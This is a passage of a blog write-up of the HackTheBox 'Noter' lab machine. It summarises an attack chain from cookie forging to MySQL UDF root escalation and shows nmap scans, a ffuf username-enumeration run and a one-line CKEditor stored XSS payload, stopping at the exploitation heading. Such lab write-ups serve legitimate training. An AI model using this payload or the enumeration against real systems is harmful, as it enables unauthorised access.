<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="HackTheBox - Noter" />
<meta property="og:locale" content="en" />
<meta name="description" content="HackTheBox &quot;Noter&quot; wirteup is now available!" />
<meta property="og:description" content="HackTheBox &quot;Noter&quot; wirteup is now available!" />
<link rel="canonical" href="http://localhost:4000/posts/noter/" />
<meta property="og:url" content="http://localhost:4000/posts/noter/" />
<meta property="og:site_name" content="0xbro" />
<meta property="og:image" content="http://localhost:4000/assets/img/Noter/Noter.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-03-28T00:00:00+02:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/Noter/Noter.png" />
<meta property="twitter:title" content="HackTheBox - Noter" />
<meta name="twitter:site" content="@sec_0xbro" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-03-28T00:00:00+02:00","datePublished":"2023-03-28T00:00:00+02:00","description":"HackTheBox &quot;Noter&quot; wirteup is now available!","headline":"HackTheBox - Noter","image":"http://localhost:4000/assets/img/Noter/Noter.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/noter/"},"url":"http://localhost:4000/posts/noter/"}</script>
<!-- End Jekyll SEO tag -->


  <title>HackTheBox - Noter | 0xbro
  </title>

  <!--
  Custom Favicons - using favicon.ico only
-->

<link rel="icon" type="image/x-icon" href="/assets/img/favicons/favicon.png">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.png">

  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/0xbro-light.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">0xbro</a>
    <p class="site-subtitle fst-italic mb-0">A penetration tester, vulnerability researcher, content creator & wannabe ethical hacker blog.</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>

      <!-- Main tabs: Talks, Side projects, About (order 1-4) -->
      
        
          <li class="nav-item">
            <a href="/about/" class="nav-link">
              <i class="fa-fw fas fa-info-circle"></i>
              <span>ABOUT</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/timeline/" class="nav-link">
              <i class="fa-fw fas fa-timeline"></i>
              <span>TIMELINE</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/disclosure/" class="nav-link">
              <i class="fa-fw fas fa-handshake"></i>
              <span>DISCLOSURE</span>
            </a>
          </li>
        
      
        
      
        
      
        
      
        
      

      <!-- Separator -->
      <li class="nav-item nav-separator">
        <hr class="sidebar-divider">
      </li>

      <!-- Blog tabs: Archive, Categories, Tags (order 5+) -->
      
        
      
        
      
        
      
        
          <li class="nav-item">
            <a href="/categories/" class="nav-link">
              <i class="fa-fw fas fa-stream"></i>
              <span>CATEGORIES</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/projects/" class="nav-link">
              <i class="fa-fw fas fa-code"></i>
              <span>PROJECTS</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/tags/" class="nav-link">
              <i class="fa-fw fas fa-tags"></i>
              <span>TAGS</span>
            </a>
          </li>
        
      
        
          <li class="nav-item">
            <a href="/archives/" class="nav-link">
              <i class="fa-fw fas fa-archive"></i>
              <span>ARCHIVES</span>
            </a>
          </li>
        
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    

      
        <a
          href="https://github.com/0xb120"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    

      
        <a
          href="https://twitter.com/sec_0xbro"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fa-brands fa-x-twitter"></i>
        </a>
      
    
          
      

      
        <a
          href="https://www.linkedin.com/in/mattia-brollo-b4129614b/"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    
          
        

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->

    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>HackTheBox - Noter</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>HackTheBox - Noter</h1>
    
      <p class="post-desc fw-light mb-4">HackTheBox &quot;Noter&quot; wirteup is now available!</p>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1679954400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Mar 28, 2023
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/Noter/Noter.png" class="popup img-link preview-img shimmer"><img src="/assets/img/Noter/Noter.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://twitter.com/sec_0xbro">0xbro</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="5274 words"
>
  <em>29 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">HackTheBox - Noter</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">HackTheBox - Noter</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <h2 id="resolution-summary"><span class="me-2">Resolution summary</span><a href="#resolution-summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<ul>
  <li>The web application used different error messages when trying to login with existing users, allowing to <strong>enumerate usernames</strong> and discover <strong>blue</strong>.</li>
  <li>The session cookie provided to authenticated users was <strong>signed using a weak secret</strong>. It was possible to <strong>bruteforce</strong> it and <strong>sign arbitrary cookie</strong>, impersonating any existing user (blue)</li>
  <li>Enumerating <strong>blueâ€™s  notes</strong> it was possible to discover <strong>its credentials</strong> and access <strong>FTP</strong>. Inside its notes it was also possible to discover the <strong>ftp_admin</strong> user</li>
  <li>Inside FTP a documents containing password policy was discovered and it was possible to <strong>guess ftp_admin credentials.</strong> Accessing FTP as ftp_admin it was possible to discover <strong>two backups of the web application</strong>.</li>
  <li><strong>Code review</strong> allowed to identify some <strong>command injection vulnerabilities</strong> contained within the <code class="language-plaintext highlighter-rouge">/export_note_remote</code> and <code class="language-plaintext highlighter-rouge">/export_note_local/&lt;string:id&gt;</code>, allowing to execute arbitrary commands and obtain a shell as <strong>svc</strong></li>
  <li>Using <strong>hardcoded credentials</strong> from the backup files it was possible to access MySQL with high privileges and exploit <strong>User-Defined Function</strong> (UDF) <strong>Dynamic Library</strong> to elevate privileges to root</li>
</ul>

<h3 id="improved-skills"><span class="me-2">Improved skills</span><a href="#improved-skills" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>Bruteforce weak signed cookie in order to sign custom ones</li>
  <li>Review application code to find command injection vulnerabilities</li>
  <li>Exploit UDF Dynamic Library to elevate privileges</li>
</ul>

<h3 id="used-tools"><span class="me-2">Used tools</span><a href="#used-tools" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>nmap</li>
  <li>gobuster</li>
  <li>ffuf</li>
  <li>custom python code</li>
  <li>ftp</li>
  <li>diff</li>
  <li>public exploit</li>
</ul>

<hr />

<h2 id="information-gathering"><span class="me-2">Information Gathering</span><a href="#information-gathering" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Scanned all TCP ports:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/CTFs/HTB/B2R/Noter]
â””â”€<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> 10.129.58.132 <span class="nt">-v</span> <span class="nt">-oN</span> scan/all-tcp-ports.txt
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali:
...
Nmap scan report <span class="k">for </span>10.129.58.132
Host is up <span class="o">(</span>0.042s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
5000/tcp open  upnp

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>27.26 seconds
           Raw packets sent: 65675 <span class="o">(</span>2.890MB<span class="o">)</span> | Rcvd: 65539 <span class="o">(</span>2.622MB<span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Enumerated open TCP ports:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/CTFs/HTB/B2R/Noter]
â””â”€<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sT</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p21</span>,22,5000 <span class="nt">-oN</span> scan/open-tcp-ports.txt 10.129.58.132
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-05-08 08:53 EDT
Nmap scan report <span class="k">for </span>10.129.58.132
Host is up <span class="o">(</span>0.038s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d <span class="o">(</span>RSA<span class="o">)</span>
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 <span class="o">(</span>ED25519<span class="o">)</span>
5000/tcp open  http    Werkzeug httpd 2.0.2 <span class="o">(</span>Python 3.8.10<span class="o">)</span>
|_http-title: Noter
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>10.87 seconds
</pre></td></tr></tbody></table></code></div></div>

<p>Enumerated top 200 UDP ports:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/CTFs/HTB/B2R/Noter]
â””â”€<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sU</span> <span class="nt">--top-ports</span> 200 10.129.58.132
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-05-08 08:55 EDT
Nmap scan report <span class="k">for </span>10.129.58.132
Host is up <span class="o">(</span>0.038s latency<span class="o">)</span><span class="nb">.</span>
All 200 scanned ports on 10.129.58.132 are <span class="k">in </span>ignored states.
Not shown: 159 closed udp ports <span class="o">(</span>port-unreach<span class="o">)</span>, 41 open|filtered udp ports <span class="o">(</span>no-response<span class="o">)</span>

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>164.86 seconds
</pre></td></tr></tbody></table></code></div></div>

<h2 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<h3 id="port-21---ftp-vsftpd-303"><span class="me-2">Port 21 - FTP (vsftpd 3.0.3)</span><a href="#port-21---ftp-vsftpd-303" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>No anonymous access</p>

<h3 id="port-5000---http-werkzeug-httpd-202-python-3810"><span class="me-2">Port 5000 - HTTP (Werkzeug httpd 2.0.2 (Python 3.8.10))</span><a href="#port-5000---http-werkzeug-httpd-202-python-3810" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Browsed port 5000:</p>

<p><a href="/assets/img/Noter/Untitled.png" class="popup img-link shimmer"><img src="/assets/img/Noter/Untitled.png" alt="Untitled" loading="lazy"></a></p>

<p>Registered a new user:</p>

<aside>
ðŸ”‘ 0xbro     password

</aside>

<p><a href="/assets/img/Noter/Untitled%201.png" class="popup img-link shimmer"><img src="/assets/img/Noter/Untitled%201.png" alt="Untitled" loading="lazy"></a></p>

<p>Enumerated VIP function:</p>

<p><a href="/assets/img/Noter/Untitled%202.png" class="popup img-link shimmer"><img src="/assets/img/Noter/Untitled%202.png" alt="Untitled" loading="lazy"></a></p>

<p>Enumerated software version:</p>

<p><a href="/assets/img/Noter/Untitled%203.png" class="popup img-link shimmer"><img src="/assets/img/Noter/Untitled%203.png" alt="CKEditor 4.6.2" loading="lazy"></a></p>

<p>CKEditor 4.6.2</p>

<h4 id="stored-xss-vulnerability-cve-2021-33829"><span class="me-2">Stored XSS vulnerability (CVE-2021-33829):</span><a href="#stored-xss-vulnerability-cve-2021-33829" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p><a href="https://checkmarx.com/blog/cve-2021-33829-stored-xss-vulnerability-discovered-in-ckeditor4-affects-widely-used-cms/">CVE-2021-33829: Stored XSS Vulnerability Discovered in CKEditor4 Affects Widely-Used CMS</a></p>

<p><code class="language-plaintext highlighter-rouge">Xss&lt;!--{cke_protected} --!&gt;&lt;img src=1 onerror=alert(</code>XSS<code class="language-plaintext highlighter-rouge">)&gt;--&gt;Attack</code></p>

<h4 id="user-enumeration"><span class="me-2">User Enumeration</span><a href="#user-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>Existing user:</p>

<p><a href="/assets/img/Noter/Untitled%204.png" class="popup img-link shimmer"><img src="/assets/img/Noter/Untitled%204.png" alt="Untitled" loading="lazy"></a></p>

<p>Non existing user:</p>

<p><a href="/assets/img/Noter/Untitled%205.png" class="popup img-link shimmer"><img src="/assets/img/Noter/Untitled%205.png" alt="Untitled" loading="lazy"></a></p>

<p>Enumerated existing users:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>maoutisã‰¿kali<span class="o">)</span>-[/usr/share/wordlists/seclists]
â””â”€<span class="nv">$ </span>ffuf <span class="nt">-w</span> /usr/share/seclists/Usernames/cirt-default-usernames.txt  <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s2">"username=FUZZ&amp;password=xxx"</span> <span class="nt">-u</span> http://noter.htb:5000/login <span class="nt">-H</span> <span class="s1">'Content-Type: application/x-www-form-urlencoded'</span> <span class="nt">-mr</span> <span class="s2">"Invalid login"</span>                    2 â¨¯

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : POST
 :: URL              : http://noter.htb:5000/login
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/cirt-default-usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&amp;password=xxx
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: Invalid login
________________________________________________

maoutis                 [Status: 200, Size: 2028, Words: 432, Lines: 69]
blue                    [Status: 200, Size: 2025, Words: 432, Lines: 69]
:: Progress: [829/829] :: Job [1/1] :: 365 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="exploitation"><span class="me-2">Exploitation</span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

